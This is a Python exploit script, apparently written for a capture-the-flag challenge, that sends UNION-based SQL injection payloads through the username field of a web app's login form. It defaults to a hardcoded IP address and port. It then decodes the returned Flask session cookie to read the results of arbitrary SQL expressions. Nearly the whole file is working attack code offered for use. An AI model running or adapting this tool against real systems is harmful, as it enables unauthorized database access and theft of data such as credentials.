#!/usr/bin/env python3
import argparse
import base64
import json
import re
import urllib.parse
import urllib.request
import zlib


class NoRedirect(urllib.request.HTTPErrorProcessor):
    def http_response(self, request, response):
        return response

    https_response = http_response


def decode_flask_session(cookie_value: str) -> dict:
    if not cookie_value:
        return {}

    if cookie_value.startswith('.'):
        parts = cookie_value.split('.')
        if len(parts) < 2:
            return {}
        payload_b64 = parts[1]
        compressed = True
    else:
        payload_b64 = cookie_value.split('.')[0]
        compressed = False

    raw = base64.urlsafe_b64decode(payload_b64 + '=' * (-len(payload_b64) % 4))
    if compressed:
        raw = zlib.decompress(raw)

    try:
        return json.loads(raw.decode('utf-8', 'ignore'))
    except Exception:
        return {"raw": raw.decode('utf-8', 'ignore')}


def run_sqli_query(base_url: str, sql_expr: str, timeout: int = 15) -> tuple[int, str, dict, str]:
    payload = (
        "' UNION SELECT "
        f"1,({sql_expr}),'x','probe','engineer','x','TGP-PROBE'"
        "-- -"
    )

    body = urllib.parse.urlencode({
        'username': payload,
        'password': 'x',
    }).encode()

    req = urllib.request.Request(
        base_url.rstrip('/') + '/login',
        data=body,
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
    )

    opener = urllib.request.build_opener(NoRedirect)
    with opener.open(req, timeout=timeout) as resp:
        status = resp.getcode()
        headers = '\n'.join(f"{k}: {v}" for k, v in resp.getheaders())
        body_text = resp.read().decode('utf-8', 'ignore')

    m = re.search(r"Set-Cookie: session=([^;]+)", headers, re.IGNORECASE)
    cookie = m.group(1) if m else ''
    session_data = decode_flask_session(cookie)
    return status, headers, session_data, body_text


def main() -> None:
    parser = argparse.ArgumentParser(description='Run SQLi expression and decode returned Flask session.')
    parser.add_argument('--url', default='http://209.38.92.205:33135', help='Base challenge URL')
    parser.add_argument('--expr', required=True, help='SQL expression to place in UNION column #2')
    parser.add_argument('--timeout', type=int, default=20)
    args = parser.parse_args()

    try:
        status, headers, session_data, body = run_sqli_query(args.url, args.expr, args.timeout)
        print(f"HTTP Status: {status}")
        print("--- Headers ---")
        print(headers)
        print("--- Decoded Session ---")
        print(json.dumps(session_data, indent=2, ensure_ascii=False))
        if "Authentication service unavailable" in body:
            print("--- App Error ---")
            print("Authentication service unavailable")
    except Exception as exc:
        print(f"ERROR: {exc}")


if __name__ == '__main__':
    main()
